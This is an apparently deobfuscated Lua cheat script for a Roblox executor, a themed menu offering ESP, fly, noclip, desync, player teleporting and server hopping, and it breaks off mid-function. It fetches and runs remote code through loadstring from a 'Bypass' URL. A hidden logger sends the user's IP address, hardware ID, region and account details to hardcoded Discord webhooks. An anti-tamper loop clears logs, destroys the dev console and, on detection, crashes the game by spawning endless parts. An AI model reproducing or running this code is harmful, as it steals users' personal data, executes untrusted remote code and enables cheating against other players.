--[[



DeObfuscate By.lyy
2026/10/8
逻辑已96%左右还原
还原100%只是时间问题 变量名已经部分还原

]]
local function luraph_box(b)
	return b[7][b[6]]
end

local function luraph_box_set(b, v)
	b[7][b[6]] = v
end

local function luraph_runtime1(...)
	error("lph run time be shit pls ")
end

pcall(setfpscap, 2000)

repeat
	Wait()
until game:IsLoaded()

GetService = function(D)
	return cloneref(game:GetService(D))
end

Game = game
Tick = tick

IsA = function(D, H)
	if D == nil then
		return false
	end
	return D:IsA(H)
end

Clone = Game.Clone
Destroy = Game.Destroy
WaitForChild = Game.WaitForChild
GetChildren = Game.GetChildren
GetDescendants = Game.GetDescendants

IsDescendantOf = function(D, H)
	if D == nil or H == nil then
		return false
	end
	return D:IsDescendantOf(H)
end

FindFirstChild = Game.FindFirstChild
FindFirstChildOfClass = Game.FindFirstChildOfClass
FindFirstChildWhichIsA = Game.FindFirstChildWhichIsA
GetPropertyChangedSignal = Game.GetPropertyChangedSignal
Type = type
GetGc = getgc
Date = os.date
TypeOf = typeof
RawGet = rawget
Clock = os.clock
CloneRef = cloneref
CheckCaller = checkcaller
HookFunction = hookfunction
HookMetaMethod = hookmetamethod
GetCallingScript = getcallingscript
GetNamecallMethod = getnamecallmethod
NewUDim = UDim.new
NewUDim2 = UDim2.new
NewCFrame = CFrame.new
NewVector2 = Vector2.new
NewVector3 = Vector3.new
NewDrawing = Drawing.new
NewInstance = Instance.new
NewTweenInfo = TweenInfo.new
NewFont = Font.new
NewRect = Rect.new
Angles = CFrame.Angles
NewRayParams = RaycastParams.new
NewColor3 = Color3.new
NewRGB = Color3.fromRGB
FromHSV = Color3.fromHSV
FromHex = Color3.fromHex
White = NewRGB(255, 255, 255)
EmptyCFrame = NewCFrame()
EmptyUDim = NewUDim(0, 0)

EmptyFunction = function() end

EmptyVector2 = NewVector2(0, 0)
EmptyUDim2 = NewUDim2(0, 0, 0, 0)
EmptyVector3 = NewVector3(0, 0, 0)
Dot = EmptyVector3.Dot
PointToObjectSpace = EmptyCFrame.PointToObjectSpace
Sub = string.sub
GSub = string.gsub
Lower = string.lower
Split = string.split
Match = string.match
Format = string.format
StringFind = string.find
Wait = task.wait
Spawn = task.spawn
Delay = task.delay
Cancel = task.cancel
Sort = table.sort
Find = table.find
Clear = table.clear
Remove = table.remove
Unpack = table.unpack
Concat = table.concat
Insert = table.insert
Pi = 3.1415926535897931
Sin = math.sin
Cos = math.cos
Abs = math.abs
Tan = math.tan
Min = math.min
Max = math.max
Rad = math.rad
Ceil = math.ceil
Acos = math.acos
Sqrt = math.sqrt
Huge = math.huge
Round = math.round
Clamp = math.clamp
Atan2 = math.atan2
Floor = math.floor
NewRandom = Random.new
Random = math.random
Infinite = math.huge
ToRad = Pi / 180
TwoPi = Pi * 2
Stats = GetService("Stats")
Players = GetService("Players")
CoreGui = GetService("CoreGui")
Lighting = GetService("Lighting")
Workspace = GetService("Workspace")
Debris = GetService("Debris")
RunService = GetService("RunService")
StarterGui = GetService("StarterGui")
GuiService = GetService("GuiService")
TextService = GetService("TextService")
HttpService = GetService("HttpService")
TweenService = GetService("TweenService")
SoundService = GetService("SoundService")
TeleportService = GetService("TeleportService")
TextChatService = GetService("TextChatService")
UserInputService = GetService("UserInputService")
ReplicatedStorage = GetService("ReplicatedStorage")
PathfindingService = GetService("PathfindingService")
Raycast = Workspace.Raycast
SetCore = StarterGui.SetCore
Stepped = RunService.Stepped
GetPlayers = Players.GetPlayers
Heartbeat = RunService.Heartbeat
LocalPlayer = Players.LocalPlayer
JSONDecode = HttpService.JSONDecode
JSONEncode = HttpService.JSONEncode
GetGuiInset = GuiService.GetGuiInset
CurrentCamera = Workspace.CurrentCamera
RenderStepped = RunService.RenderStepped
PreSimulation = RunService.PreSimulation
GetMouseLocation = UserInputService.GetMouseLocation

Connect = function(D, H)
	return D:Connect(H)
end

GetAttribute = function(arg, arg2)
	if arg == nil then
		return nil
	end
	return arg:GetAttribute(arg2)
end

SetAttribute = function(arg, arg2, arg3)
	if arg == nil then
		return
	end
	arg:SetAttribute(arg2, arg3)
end

Disconnect = function(arg)
	if arg == nil then
		return
	end
	arg:Disconnect()
end

if getconnections then
	GetConnections = getconnections
end

PlayerScripts = WaitForChild(LocalPlayer, "PlayerScripts")
Teams = GetService("Teams")
UserService = GetService("UserService")
ReplicatedFirst = GetService("ReplicatedFirst")
CollectionService = GetService("CollectionService")
MarketplaceService = GetService("MarketplaceService")
IsOnMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled or false
oldTI = getthreadidentity() or 8

if getconnections then
	local v = next
	local connections, v2 = GetConnections(LocalPlayer.Idled)

	for _, v3 in v, connections, v2 do
		Disconnect(v3)
	end
else
	Connect(LocalPlayer.Idled, function()
		GetService("VirtualUser"):CaptureController()
		GetService("VirtualUser"):ClickButton2(NewVector2())
	end)
end

TextChatService.ChatWindowConfiguration.Enabled = true

Connect(GetPropertyChangedSignal(TextChatService.ChatWindowConfiguration, "Enabled"), function()
	if TextChatService.ChatWindowConfiguration.Enabled ~= true then
		TextChatService.ChatWindowConfiguration.Enabled = true
	end
end)

Spawn(function()
	pcall(function()
		ReplicatedFirst.ChatFilter.Disabled = true
	end)
end)

local currentCamera = workspace.CurrentCamera

local function fn(D, H)
	return Connect(D, H)
end

FindFirstAncestorOfClass = function(D, H)
	if D == nil then
		return nil
	end
	return D:FindFirstAncestorOfClass(H)
end

IsAncestorOf = function(D, H)
	if D == nil or H == nil then
		return false
	end
	return D:IsAncestorOf(H)
end

RaycastWorkspace = function(D, H, m)
	return Raycast(Workspace, D, H, m)
end

BindCamera = function(H)
	luraph_box(D[1])()
	local __boxv0 = H
	luraph_box_set(D[2], __boxv0)
	if not H then
		return
	end
	local __boxv0 = luraph_box(D[3])(GetPropertyChangedSignal(H, "FieldOfView"), luraph_box(D[4]))
	luraph_box_set(D[5], __boxv0)
	local __boxv0 = luraph_box(D[3])(GetPropertyChangedSignal(H, "ViewportSize"), luraph_box(D[6]))
	luraph_box_set(D[7], __boxv0)
	luraph_box(D[6])()
	luraph_box(D[4])()
end

UpdateFrustum = function(H)
	if H ~= luraph_box(D[1]) then
		BindCamera(H)
		return
	end

	if H then
		luraph_box(D[2])()
		luraph_box(D[3])()
	end
end

WorldToViewport = function(H)
	if not luraph_box(D[1]) then
		return 0, 0, 0, false
	end
	local m = PointToObjectSpace(luraph_box(D[1]).CFrame, H)
	H = -m.Z
	local h = 2 * H
	if h == 0 or luraph_box(D[2]) == 0 or luraph_box(D[3]) == 0 then
		return 0, 0, H, false
	end
	local B = luraph_box(D[4]) * (0.5 + m.X / (h * luraph_box(D[2])))
	local t = luraph_box(D[5]) * (0.5 - m.Y / (h * luraph_box(D[3])))
	return B, t, H, H > 0 and B >= 0 and B <= luraph_box(D[4]) and t >= 0 and t <= luraph_box(D[5])
end

LookAngle = function(D, H, m)
	local h = m - H
	if h.Magnitude < 0.001 then
		return 0
	end
	return Acos(Clamp(Dot(D, h.Unit), -1, 1)) * 2
end

BindLocalCharacter = function(H)
	local __boxv0 = H
	luraph_box_set(D[1], __boxv0)
	if not H then
		return
	end
	local __boxv0 = FindFirstChildOfClass(H, "Humanoid")
	luraph_box_set(D[2], __boxv0)
	local __boxv0 = FindFirstChild(H, "HumanoidRootPart")
	luraph_box_set(D[3], __boxv0)

	if not luraph_box(D[3]) or not luraph_box(D[2]) then
		local m = nil

		m = luraph_box(D[4])(H.DescendantAdded, function(H)
			local h = H.Name

			if h == "HumanoidRootPart" then
				local __boxv0 = H
				luraph_box_set(D[3], __boxv0)
			else
				local h = IsA

				if h(H, "Humanoid") then
					local __boxv0 = H
					luraph_box_set(D[2], __boxv0)
				end
			end

			if luraph_box(D[3]) and luraph_box(D[2]) then
				Disconnect(m)
			end
		end)
	end
end

BindCharacterCache = function(D, H)
	D.Character = H
	D.RootPart = nil
	D.Humanoid = nil
	D.Head = nil
	if not H then
		return
	end
	D.RootPart = FindFirstChild(H, "HumanoidRootPart")
	D.Head = FindFirstChild(H, "Head")
	D.Humanoid = FindFirstChildOfClass(H, "Humanoid")
end

GetPlayerList = function()
	return GetPlayers(Players)
end

MouseLocation = function()
	return GetMouseLocation(UserInputService)
end

Camera = function()
	return luraph_box(D[1])
end

GetScreenX = function()
	return luraph_box(D[1])
end

GetScreenY = function()
	return luraph_box(D[1])
end

GetLocalHumanoid = function()
	if luraph_box(D[1]) and luraph_box(D[1]).Parent then
		return luraph_box(D[1])
	end
	return nil
end

GetLocalRoot = function()
	if luraph_box(D[1]) and luraph_box(D[1]).Parent then
		return luraph_box(D[1])
	end
	return nil
end

GetLocalCharacter = function()
	return luraph_box(D[1])
end

UpdateFovCircle = function(D, H, m, h)
	if D.Visible ~= H then
		D.Visible = H
	end

	if not H then
		return
	end
	H = White

	if D.Color ~= H then
		D.Color = H
	end

	if D.Position ~= h then
		D.Position = h
	end

	if D.Radius ~= m then
		D.Radius = m
	end
end

BindCamera(currentCamera)

fn(GetPropertyChangedSignal(workspace, "CurrentCamera"), function()
	BindCamera(workspace.CurrentCamera)
end)

BindLocalCharacter(LocalPlayer.Character)

fn(LocalPlayer.CharacterAdded, function(D)
	BindLocalCharacter(D)
end)

fn(LocalPlayer.CharacterRemoving, function() end)
local lib = loadstring(game:HttpGet("https://cnb.cool/MoonLua/Adnonis/-/git/raw/main/Bypass"))()

if lib.Detect() then
	lib.Bypass()
end

local function fn2(arg, arg2)
	local v = LocalPlayer

	local function fn3()
		if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
			return "Mobile"
		end

		if UserInputService.KeyboardEnabled then
			return "PC"
		end

		if UserInputService.GamepadEnabled then
			return "Console"
		end
		return "Unknown"
	end

	local str

	if identifyexecutor then
		str = identifyexecutor()
	elseif syn then
		str = "Synapse X"
	elseif KRNL_LOADED then
		str = "Krnl"
	elseif fluxus then
		str = "Fluxus"
	elseif is_sirhurt_closure then
		str = "SirHurt"
	else
		str = "Unknown"

		if OXYGEN then
			str = "Oxygen U"
		end
	end

	local str2 = "Unavailable"

	pcall(function()
		str2 = tostring(GetService("RbxAnalyticsService"):GetClientId())
	end)

	local str3 = "Unknown"

	pcall(function()
		local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)

		if productInfo and productInfo.Name then
			str3 = productInfo.Name
		end
	end)

	local str4 = "Unknown"

	pcall(function()
		str4 = tostring(GetService("LocalizationService"):GetCountryRegionForPlayerAsync(v) or "Unknown")
	end)

	local str5 = "Unavailable"

	pcall(function()
		local response = game:HttpGet("https://api.ipify.org")

		if response and response ~= "" then
			str5 = response
		end
	end)

	local str6 = "Unknown"
	local str7 = "Free"

	pcall(function()
		str6 = tostring(v.AccountAge) .. " days"
		str7 = v.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
	end)

	local tbl = {
		avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="
			.. tostring(v.UserId)
			.. "&width=150&height=150&format=png",
		content = arg2 or "",
		username = "Roblox Logger",
	}

	local tbl2 = {
		name = "Game Info",
		value = "Game Name: " .. str3 .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId,
		inline = false,
	}

	tbl.embeds = {
		{
			title = "Script Execution Report",
			color = 3447003,
			author = {
				name = v.Name,
				icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId="
					.. tostring(v.UserId)
					.. "&width=150&height=150&format=png",
			},
			thumbnail = {
				url = "https://www.roblox.com/headshot-thumbnail/image?userId="
					.. tostring(v.UserId)
					.. "&width=420&height=420&format=png",
			},
			fields = {
				{
					name = "User Info",
					value = "Username: " .. v.Name .. "\nUser ID: " .. v.UserId .. "\nPlatform: " .. fn3(),
					inline = false,
				},
				{
					name = "Executor Info",
					value = "Executor: " .. str .. "\nVersion: " .. "N/A" .. "\nHWID: " .. str2,
					inline = false,
				},
				tbl2,
				{
					name = "Network Info",
					value = "IP Address: " .. str5 .. "\nRegion: " .. str4,
					inline = false,
				},
				{
					name = "Account Info",
					value = "Account Age: " .. str6 .. "\nMembership: " .. str7,
					inline = false,
				},
			},
			footer = { text = "User ID: " .. tostring(v.UserId) },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
		},
	}

	local ok, result = pcall(function()
		return HttpService:JSONEncode(tbl)
	end)

	if not ok then
		print("JSON encoding failed")
		return
	end
	local request_ = syn and syn.request or request or http_request
	if not request_ then
		print("Error: no request (syn.request / request / http_request)")
		return
	end

	local v2 =
		request_({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })

	if v2 then
		if not (v2.StatusCode == 200 or v2.StatusCode == 204) then
			print("Webhook error:", v2.StatusCode)

			if v2.Body then
				print("Response:", v2.Body)
			end
		end
	else
		print("ERROR: No response from server")
	end
end

local function fn3() end

local function fn4() end

local function fn5() end

local v2 = hookfunction

local v3 = luraph_runtime1(function() end)

v2(fn3, v3)
local v4 = hookfunction

local v5 = luraph_runtime1(function() end)

v4(fn4, v5)
local v6 = hookfunction

local v7 = luraph_runtime1(function() end)

v6(fn5, v7)

Spawn(function()
	local flag = false
	local str = ""

	while true do
		if SCRIPT_KEY == "D022048F29" then
			return
		else
			GetService("LogService"):ClearOutput()

			if FindFirstChild(CoreGui, "DevConsoleMaster") then
				str ..= "detected DevConsoleMaster "
				CoreGui.DevConsoleMaster:Destroy()
				flag = true
			end

			if dtspy or getgenv().CobaltInitialized or getgenv().SimpleSpyExecuted then
				str ..= "detected spy "
				flag = true
			end

			if not isfunctionhooked(fn3) or not isfunctionhooked(fn4) or not isfunctionhooked(fn5) then
				str ..= "hookmetamethod isfunctionhooked "
				flag = true
			end

			if isfunctionhooked(loadstring) then
				str ..= "hookmetamethod loadstring "
				flag = true
			end

			if isfunctionhooked(game.HttpGet) then
				str ..= "hookmetamethod game.HttpGet "
				flag = true
			end

			if isfunctionhooked(request) then
				str ..= "hookmetamethod request "
				flag = true
			end

			if isfunctionhooked(game.HttpGet) then
				str ..= "hookmetamethod HttpGet "
				flag = true
			end

			if isfunctionhooked(getrawmetatable) then
				str ..= "hookmetamethod getrawmetatable "
				flag = true
			end

			if isfunctionhooked(Players.LocalPlayer.Kick) then
				str ..= "hookmetamethod Kick "
				flag = true
			end

			if isfunctionhooked(HttpService.GetAsync) then
				str ..= "hookmetamethod GetAsync "
				flag = true
			end

			if isfunctionhooked(HttpService.JSONDecode) then
				str ..= "hookmetamethod JSONDecode "
				flag = true
			end

			if isfunctionhooked(Players.LocalPlayer.IsInGroup) then
				str ..= "hookmetamethod IsInGroup "
				flag = true
			end

			if isfunctionhooked(HttpService.RequestAsync) then
				str ..= "hookmetamethod RequestAsync "
				flag = true
			end

			if isfunctionhooked(HttpService.PostAsync) then
				str ..= "hookmetamethod PostAsync "
				flag = true
			end

			if flag then
				break
			end
			Wait(3)
		end
	end

	pcall(
		fn2,
		"https://discord.com/api/webhooks/1501722704871690392/lwlnk748HLcSVL2lpvDsVM5jHl1i3fUWaS0Z3wN3Lk4bvaaJOuqdAOIndARsvvXhqDgz",
		SCRIPT_KEY .. " " .. str
	)

	Wait(5)

	while true do
		pcall(function()
			for i = 1, 1000 do
				for k in pairs(GetDescendants(game)) do
					NewInstance("Part", workspace)
				end
			end
		end)

		Wait()
	end
end)

local tbl = { APPID = "22468", VERSION = "1.1", KEY = SCRIPT_KEY or "" }
tbl.HWID = GetService("RbxAnalyticsService"):GetClientId()
tbl.NOTICE = ""
tbl.TOKEN = ""
tbl.kmlogon = "http://wy.llua.cn/api/?id=kmlogon&app=" .. tbl.APPID
tbl.notice = "http://wy.llua.cn/api/?id=notice&app=" .. tbl.APPID

tbl.heartbeat = "http://wy.llua.cn/api/?id=heartbeat&app="
	.. tbl.APPID
	.. "&kami="
	.. tbl.KEY
	.. "&markcode="
	.. tbl.HWID
	.. "&token="

local function fn6(arg, arg2, duration)
	print(arg, arg2)
	local tbl2 = { Title = arg, Text = tostring(arg2) }

	if duration then
		tbl2.Duration = duration
	end

	GetService("StarterGui"):SetCore("SendNotification", tbl2)
end

local httpService = HttpService

local ok, result = pcall(function()
	return request({ Url = tbl.kmlogon, Method = "GET" })
end)

if not ok then
	fn6("版本检查失败", result)

	while true do
		Wait()
	end
else
	local data = httpService:JSONDecode(result.Body)

	if not data then
		fn6("版本检查失败", "返回数据解析失败")

		while true do
			Wait()
		end
	else
		local version = data.version
		local appUpdateShow = data.app_update_show or "发现新版本，请更新后使用"
		local appUpdateUrl = data.app_update_url or ""

		if not version and type(data.msg) == "table" then
			version = data.msg.version
		end

		if version and tostring(version) ~= tostring(tbl.VERSION) then
			if appUpdateUrl ~= "" then
				appUpdateShow ..= "\n下载地址已复制到剪贴板"

				pcall(function()
					setclipboard(appUpdateUrl)
				end)
			end

			fn6("需要更新", appUpdateShow, 10)

			while true do
				Wait()
			end
		else
			local ok2, result2 = pcall(function()
				return request({ Url = tbl.notice, Method = "GET" })
			end)

			if ok2 and result2 and result2.Body then
				local data2 = httpService:JSONDecode(result2.Body)

				if data2 and tonumber(data2.code) == 200 then
					local msg = data2.msg
					local appGg

					if type(msg) == "table" and msg.app_gg ~= nil then
						appGg = msg.app_gg
					else
						appGg = nil

						if data2.app_gg ~= nil then
							appGg = data2.app_gg
						end
					end

					if appGg ~= nil then
						tbl.NOTICE = appGg
					end
				end
			end

			local str = tbl.kmlogon .. "&kami=" .. tbl.KEY .. "&markcode=" .. tbl.HWID

			local ok3, result3 = pcall(function()
				return request({ Url = str, Method = "GET" })
			end)

			if ok3 then
				local data2 = httpService:JSONDecode(result3.Body)

				if data2 then
					if data2.code == 200 and data2.msg and data2.msg.vip then
						fn6("Login Success", "Expire " .. os.date("%Y-%m-%d %H:%M:%S", data2.msg.vip))

						if data2.msg.token then
							tbl.TOKEN = data2.msg.token
						end
					elseif tostring(data2.msg) then
						fn6("Login Failed1", data2.msg)

						while true do
							Wait()
						end
					end

					Spawn(function()
						while true do
							Wait(10)

							local ok4, result4 = pcall(function()
								return request({ Url = tbl.heartbeat .. tbl.TOKEN, Method = "GET" })
							end)

							if ok4 then
								local data3 = HttpService:JSONDecode(result4.Body)
								if not data3 then
									continue
								end

								if data3.code == 200 then
									continue
								end

								pcall(function()
									for i = 1, 1000 do
										for k in pairs(GetDescendants(game)) do
											NewInstance("Part", workspace)
										end
									end
								end)
							end
						end
					end)

					Spawn(
						fn2,
						"https://discord.com/api/webhooks/1501413669739958313/_uortqJa4RSs27Eb4STj9pElnkSJD4bAVb8F5hfclJPcUo29Q1755I6va7gwvpTCz8ji",
						SCRIPT_KEY
					)

					local v = (function()
						local D, H, m, h, B, t, x, R =
							UserInputService, TweenService, Players, CoreGui, HttpService, TextService, RunService, {}

						R.__index = R
						R.Version = "6.8.15"
						R._windows = {}

						local O, k, j =
							{
								Aubergine = { Name = "Aubergine", Primary = NewRGB(94, 92, 230), Accent = NewRGB(191, 90, 242) },
								Aqua = { Name = "Aqua", Primary = NewRGB(64, 203, 224), Accent = NewRGB(100, 210, 255) },
								Banana = { Name = "Banana", Primary = NewRGB(255, 214, 10), Accent = NewRGB(255, 159, 10) },
								Blend = { Name = "Blend", Primary = NewRGB(10, 132, 255), Accent = NewRGB(100, 210, 255) },
								Blossom = { Name = "Blossom", Primary = NewRGB(255, 55, 95), Accent = NewRGB(255, 100, 130) },
								Bubblegum = { Name = "Bubblegum", Primary = NewRGB(255, 45, 85), Accent = NewRGB(191, 90, 242) },
								["Candy Cane"] = {
									Name = "Candy Cane",
									Primary = NewRGB(255, 69, 58),
									Accent = NewRGB(255, 105, 97),
								},
								Cherry = { Name = "Cherry", Primary = NewRGB(255, 59, 48), Accent = NewRGB(255, 105, 97) },
								Christmas = { Name = "Christmas", Primary = NewRGB(255, 69, 58), Accent = NewRGB(48, 209, 88) },
								Coral = { Name = "Coral", Primary = NewRGB(255, 69, 58), Accent = NewRGB(255, 159, 10) },
								["Digital Horizon"] = {
									Name = "Digital Horizon",
									Primary = NewRGB(50, 173, 230),
									Accent = NewRGB(100, 210, 255),
								},
								Express = { Name = "Express", Primary = NewRGB(255, 159, 10), Accent = NewRGB(255, 214, 10) },
								["Lime Water"] = {
									Name = "Lime Water",
									Primary = NewRGB(48, 209, 88),
									Accent = NewRGB(165, 243, 252),
								},
								Lush = { Name = "Lush", Primary = NewRGB(48, 209, 88), Accent = NewRGB(102, 212, 207) },
								Halogen = { Name = "Halogen", Primary = NewRGB(100, 210, 255), Accent = NewRGB(165, 243, 252) },
								Hyper = { Name = "Hyper", Primary = NewRGB(255, 55, 95), Accent = NewRGB(191, 90, 242) },
								Magic = { Name = "Magic", Primary = NewRGB(191, 90, 242), Accent = NewRGB(94, 92, 230) },
								May = { Name = "May", Primary = NewRGB(48, 209, 88), Accent = NewRGB(102, 212, 207) },
								["Orange Juice"] = {
									Name = "Orange Juice",
									Primary = NewRGB(255, 159, 10),
									Accent = NewRGB(255, 214, 10),
								},
								Pastel = { Name = "Pastel", Primary = NewRGB(0, 168, 255), Accent = NewRGB(0, 229, 255) },
								Pumpkin = { Name = "Pumpkin", Primary = NewRGB(255, 149, 0), Accent = NewRGB(255, 214, 10) },
								Satin = { Name = "Satin", Primary = NewRGB(191, 90, 242), Accent = NewRGB(255, 100, 130) },
								["Snowy Sky"] = {
									Name = "Snowy Sky",
									Primary = NewRGB(100, 185, 255),
									Accent = NewRGB(165, 220, 255),
								},
								["Steel Fade"] = {
									Name = "Steel Fade",
									Primary = NewRGB(142, 142, 147),
									Accent = NewRGB(174, 174, 178),
								},
								Sundae = { Name = "Sundae", Primary = NewRGB(255, 159, 10), Accent = NewRGB(255, 100, 130) },
								Sunkist = { Name = "Sunkist", Primary = NewRGB(255, 120, 0), Accent = NewRGB(255, 193, 7) },
								Water = { Name = "Water", Primary = NewRGB(10, 132, 255), Accent = NewRGB(100, 210, 255) },
								Legacy = { Name = "Legacy", Primary = NewRGB(0, 120, 255), Accent = NewRGB(0, 200, 255) },
								Winter = { Name = "Winter", Primary = NewRGB(100, 210, 255), Accent = NewRGB(165, 220, 255) },
								Peony = { Name = "Peony", Primary = NewRGB(255, 55, 95), Accent = NewRGB(255, 100, 130) },
								Shadow = { Name = "Shadow", Primary = NewRGB(90, 90, 95), Accent = NewRGB(142, 142, 147) },
								Wood = { Name = "Wood", Primary = NewRGB(161, 122, 90), Accent = NewRGB(188, 148, 116) },
								Creida = { Name = "Creida", Primary = NewRGB(255, 90, 40), Accent = NewRGB(255, 159, 10) },
								["Creida Two"] = {
									Name = "Creida Two",
									Primary = NewRGB(64, 203, 224),
									Accent = NewRGB(100, 210, 255),
								},
								Gothic = { Name = "Gothic", Primary = NewRGB(94, 92, 230), Accent = NewRGB(191, 90, 242) },
								Rue = { Name = "Rue", Primary = NewRGB(191, 90, 242), Accent = NewRGB(255, 100, 130) },
								Purple = { Name = "Purple", Primary = NewRGB(191, 90, 242), Accent = NewRGB(94, 92, 230) },
								Rainbow = { Name = "Rainbow", Primary = NewRGB(255, 55, 95), Accent = NewRGB(10, 132, 255) },
								Nord = { Name = "Nord", Primary = NewRGB(110, 170, 205), Accent = NewRGB(80, 120, 165) },
							}, {
								Bg = NewRGB(6, 6, 8),
								Window = NewRGB(16, 16, 19),
								Sidebar = NewRGB(20, 20, 24),
								Content = NewRGB(18, 18, 22),
								Card = NewRGB(26, 26, 31),
								CardHover = NewRGB(35, 35, 42),
								Track = NewRGB(33, 33, 39),
								TrackHover = NewRGB(42, 42, 50),
								Line = NewRGB(45, 45, 52),
								Text = NewRGB(255, 255, 255),
								SubText = NewRGB(158, 158, 166),
								Muted = NewRGB(99, 99, 107),
								Border = NewRGB(48, 48, 55),
							}, {
								Default = 14,
								WindowTitle = 21,
								VersionLabel = 13,
								CreditLabel = 11,
								NavLabel = 15,
								SearchBox = 16,
								InfoCard = 13,
								NotificationTitle = 14,
								NotificationBody = 12,
								ThemeName = { 13, 12 },
								ActiveBadge = 11,
								ModuleTitle = 16,
								CategoryLabel = 12,
								Description = 13,
								GearIcon = 16,
								ControlText = 14,
								InputBox = 12,
								KeybindBox = 12,
								ValueBox = 14,
								HexLabel = 11,
								PlayerName = { 13, 11 },
								PlayerActionButton = { 11, 10 },
								PlayerSearchBox = 13,
								ConfigTitle = 15,
								ConfigInput = 13,
								ConfigButton = 12,
								Toast = 14,
							}

						R.FontSizes = j

						local function i(z, Y)
							local U = j[z]
							if type(U) == "table" then
								return Y and (U[2] or U[1]) or U[1]
							end
							return U or j.Default
						end

						local j, z, Y, U, o, F =
							Enum.Font.BuilderSans or Enum.Font.SourceSans,
							Enum.Font.BuilderSansBold or Enum.Font.SourceSansBold,
							0.4,
							"en",
							"zh-CN",
							{
								Search = "搜索",
								Themes = "主题",
								Config = "配置",
								Language = "语言",
								Settings = "设置",
								Misc = "杂项",
								Movement = "移动",
								Render = "视觉",
								["Player List"] = "玩家列表",
								["tab-search"] = "搜索",
								["tab-themes"] = "主题",
								["tab-config"] = "配置",
								["tab-language"] = "语言",
								["tab-settings"] = "设置",
								["tab-misc"] = "杂项",
								["tab-movement"] = "移动",
								["tab-render"] = "视觉",
								["tab-player-list"] = "玩家列表",
								["ui.search"] = "搜索",
								["ui.search-placeholder"] = "搜索...",
								["ui.no-results"] = "无结果",
								["ui.active"] = "当前",
								["ui.languages"] = "语言",
								["ui.english-hint"] = "默认语言，词条不可修改",
								["ui.chinese-hint"] = "点击切换；缺翻译的模块/选项仍显示英文",
								["lang.en"] = "English",
								["lang.zh-CN"] = "简体中文",
								Keybind = "按键",
								Value = "数值",
								Mode = "模式",
								Font = "字体",
								Color = "颜色",
								Part = "部位",
								Range = "范围",
								Speed = "速度",
								["X Speed"] = "水平速度",
								["Y Speed"] = "垂直速度",
								Enabled = "启用",
								["movement-speed"] = "速度",
								["movement-high-jump"] = "高跳",
								["movement-fly"] = "飞行",
								["movement-noclip"] = "穿墙",
								["movement-spin"] = "旋转",
								["movement-desync"] = "假身",
								["render-esp"] = "ESP",
								["render-camera"] = "相机",
								["render-world"] = "世界",
								["render-bullet-tracer"] = "子弹轨迹",
								["render-hitlog"] = "命中记录",
								["misc-animation"] = "动画",
								["misc-server-hop"] = "换服",
								["misc-headless-korblox"] = "无头断腿",
								["misc-fake-player"] = "伪造玩家",
								["misc-fake-player-input"] = "用户",
								["misc-fake-player-apply"] = "伪造",
								["misc-fake-player-restore"] = "还原",
								["player-list-fake"] = "伪造",
								["player-list-blacklist"] = "黑名单",
								["player-list-whitelist"] = "白名单",
								["player-list-bring"] = "拉人",
								["player-list-looptp"] = "跟随",
								["player-list-search"] = "搜索玩家...",
								["player-list-refresh"] = "刷新",
								["settings-menu"] = "菜单",
								["settings-hit-sound"] = "命中音效",
								["settings-resolve-cache"] = "解析缓存",
								["autoload-manual-load"] = "手动加载",
								["menu-keybind"] = "菜单按键",
								["ServerHopModule.Rejoin"] = "重进",
								["ServerHopModule.Low"] = "人少",
								["ServerHopModule.Most"] = "人多",
								["ServerHopModule.Random"] = "随机",
								["ServerHopModule.CopyJoinScript"] = "复制进服脚本",
							}

						local function E(c, p)
							if type(p) ~= "table" then
								return c
							end

							for s, P in pairs(p) do
								if type(s) == "string" and type(P) == "string" and P ~= "" then
									c[s] = P
								end
							end

							return c
						end

						local function c(p)
							local s = getgenv and (getgenv()) or _G
							return s and s[p] or nil
						end

						local function p()
							local s = c("gethui")

							if typeof(s) == "function" then
								local P, J = pcall(s)
								if P and J then
									return J
								end
							end

							s = m.LocalPlayer

							if s then
								local P = FindFirstChildOfClass(s, "PlayerGui")
								if P then
									return P
								end
							end

							return h
						end

						local function h()
							if setthreadidentity then
								pcall(setthreadidentity, oldTI or 8)
							end
						end

						local function s(P, J, f)
							h()
							local w = NewInstance(P)

							for P, u in pairs(J or {}) do
								w[P] = u
							end

							if f then
								for P = 1, #f, 1 do
									f[P].Parent = w
								end
							end

							return w
						end

						local function P(J)
							return s("UICorner", { CornerRadius = NewUDim(0, J) })
						end

						local function J(f, w, u, V)
							return s("UIPadding", {
								PaddingLeft = NewUDim(0, f or 0),
								PaddingTop = NewUDim(0, w or 0),
								PaddingRight = NewUDim(0, u or 0),
								PaddingBottom = NewUDim(0, V or 0),
							})
						end

						local function f(w, u, V)
							return s("UIStroke", {
								Color = w or k.Border,
								Transparency = u or 0,
								Thickness = V or 1,
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
							})
						end

						local function w(u, V, I)
							if u == nil or u.Parent == nil then
								return nil
							end

							local e = H:Create(
								u,
								TweenInfo.new(I or 0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								V
							)

							e:Play()
							return e
						end

						local H, u, V = "ThemeGradient", 0, 0.3

						local function I(e, n, r, N, S)
							if e == nil or e.Parent == nil then
								return
							end
							local a = FindFirstChild(e, H)

							if not a then
								a = s("UIGradient", { Name = H, Rotation = N or u, Color = ColorSequence.new(n, r) })
								a.Parent = e

								if S and S._gradientInstances then
									Insert(S._gradientInstances, a)
								end
							else
								a.Color = ColorSequence.new(n, r)

								if N then
									a.Rotation = N
								end
							end

							if not IsA(e, "TextLabel") then
								e.BackgroundColor3 = NewColor3(1, 1, 1)
							else
								e.TextColor3 = NewColor3(1, 1, 1)
							end
						end

						local function u(e, n)
							if e == nil or e.Parent == nil then
								return
							end
							local r = FindFirstChild(e, H)

							if r then
								if n and n._gradientInstances then
									for H = 1, #n._gradientInstances, 1 do
										if n._gradientInstances[H] == r then
											Remove(n._gradientInstances, H)
											break
										end
									end
								end

								r:Destroy()
							end
						end

						local function H(e, ...)
							if e then
								local n, r = pcall(e, ...)

								if not n then
									error(r)
								end
							end
						end

						local function e(n, ...)
							if type(n) == "table" then
								return n
							end
							local r = { ... }
							return { Name = n, Min = r[1], Max = r[2], Default = r[3], Callback = r[4] }
						end

						local function n(r)
